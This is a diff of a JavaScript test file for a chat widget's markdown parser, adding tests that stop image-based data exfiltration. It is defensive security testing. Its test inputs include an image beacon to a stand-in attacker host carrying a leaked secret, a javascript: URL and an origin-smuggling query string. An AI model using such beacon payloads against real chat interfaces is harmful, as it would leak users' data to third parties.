@@ -1,5 +1,6 @@
-import { describe, it, expect } from 'vitest';
-import { parseMarkdown, htmlToText, escapeHtml } from '../src/markdown.js';
+import { describe, it, expect, afterEach } from 'vitest';
+import { parseMarkdown, htmlToText, escapeHtml, isAllowedImageSrc } from '../src/markdown.js';
+import { configureEndpoints } from '../src/endpoints.js';
 
 // The markdown parser is regex-based and deliberately leans on DOMPurify as the
 // real security boundary. These tests pin that boundary: the parser must never
@@ -46,7 +47,81 @@ describe('parseMarkdown — sanitization (security)', () => {
 
   it('drops non-https image sources (no IP-beaconing http img)', () => {
     const html = parseMarkdown('![x](http://evil.example/track.gif)');
-    expect(html).not.toContain('http://evil.example');
+    expect(imageSources(html)).toEqual([]);
+    expect(html).not.toMatch(/<img[^>]*evil\.example/);
+  });
+});
+
+// Parse the sanitized output the way the widget does (innerHTML) and list the
+// src of every <img> the browser would load.
+function imageSources(html) {
+  const template = document.createElement('template');
+  template.innerHTML = html;
+  return [...template.content.querySelectorAll('img')]
+    .map(img => img.getAttribute('src'))
+    .filter(Boolean);
+}
+
+describe('parseMarkdown — image exfiltration guard', () => {
+  afterEach(() => configureEndpoints(undefined));
+
+  it('does not load an image from a third-party https origin', () => {
+    const html = parseMarkdown('![](https://attacker.example/pixel.gif?leak=secret)');
+    expect(imageSources(html)).toEqual([]);
+    expect(html).not.toMatch(/<img/);
+  });
+
+  it('renders a disallowed image as a click-only link labelled with its alt text', () => {
+    const html = parseMarkdown('![Product photo](https://cdn.other.example/p.png)');
+    const template = document.createElement('template');
+    template.innerHTML = html;
+    const link = template.content.querySelector('a');
+    expect(link).not.toBeNull();
+    expect(link.getAttribute('href')).toBe('https://cdn.other.example/p.png');
+    expect(link.textContent).toBe('Product photo');
+    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
+  });
+
+  it('labels the fallback link with the URL when the alt text is empty', () => {
+    const html = parseMarkdown('![](https://cdn.other.example/p.png)');
+    expect(html).toContain('>https://cdn.other.example/p.png</a>');
+  });
+
+  it('keeps images served from the widget API origin', () => {
+    configureEndpoints({ apiUrl: 'https://app.chatvia.test/widget' });
+    const html = parseMarkdown('![chunk](https://app.chatvia.test/storage/chunk.png)');
+    expect(imageSources(html)).toEqual(['https://app.chatvia.test/storage/chunk.png']);
+  });
+
+  it('keeps same-origin images (the page the widget runs on)', () => {
+    const src = `${window.location.origin}/images/product.png`;
+    expect(imageSources(parseMarkdown(`![p](${src})`))).toEqual([src]);
+    expect(imageSources(parseMarkdown('![p](/images/product.png)'))).toEqual([
+      '/images/product.png'
+    ]);
+  });
+
+  it('keeps inline raster data: images but not SVG data: images', () => {
+    const png = 'data:image/png;base64,iVBORw0KGgo=';
+    expect(imageSources(parseMarkdown(`![p](${png})`))).toEqual([png]);
+
+    const svg = parseMarkdown('![s](data:image/svg+xml;base64,PHN2Zz4=)');
+    expect(imageSources(svg)).toEqual([]);
+    expect(svg).not.toContain('data:image/svg+xml');
+  });
+
+  it('checks the origin after HTML-escaping, so an escaped URL cannot slip through', () => {
+    configureEndpoints({ apiUrl: 'https://app.chatvia.test/widget' });
+    const html = parseMarkdown(
+      '![x](https://attacker.example/a.png?u=https://app.chatvia.test&x=1)'
+    );
+    expect(imageSources(html)).toEqual([]);
+  });
+
+  it('isAllowedImageSrc rejects non-http(s) schemes', () => {
+    expect(isAllowedImageSrc('javascript:alert(1)')).toBe(false);
+    expect(isAllowedImageSrc('ftp://example.com/a.png')).toBe(false);
+    expect(isAllowedImageSrc('')).toBe(false);
   });
 });
 
